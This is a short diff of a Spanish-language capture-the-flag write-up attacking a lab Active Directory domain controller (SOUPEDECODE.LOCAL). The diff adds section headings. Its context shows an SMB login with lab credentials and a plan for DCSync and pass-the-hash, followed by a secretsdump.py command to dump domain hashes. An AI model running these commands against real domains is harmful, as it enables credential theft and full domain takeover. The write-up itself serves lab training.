@@ -469,9 +469,10 @@ $ nxc smb 192.168.87.3 -u fbeth103 -p Pointed123!
 SMB         192.168.87.3    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
 SMB         192.168.87.3    445    DC01             [+] SOUPEDECODE.LOCAL\fbeth103:Pointed123! (Pwn3d!)
 ```
-
+# Privilege Escalation
 Indirectamente somos administradores del dominio, pero al intentar utilizar `evil-winrm` o `psexec` no termina de realizar la conexión, así que vamos a hacer un DCSync para conseguir los hashes del usuario `Administrator` y hacer Pass The Hash para poder conseguir una consola interactiva.
 
+## DSync
 Esto lo podemos hacer con `secretsdump.py`
 ```console
 $ secretsdump.py -dc-ip 192.168.87.3 'soupedecode.local/fbeth103:Pointed123!@dc01.soupedecode.local'
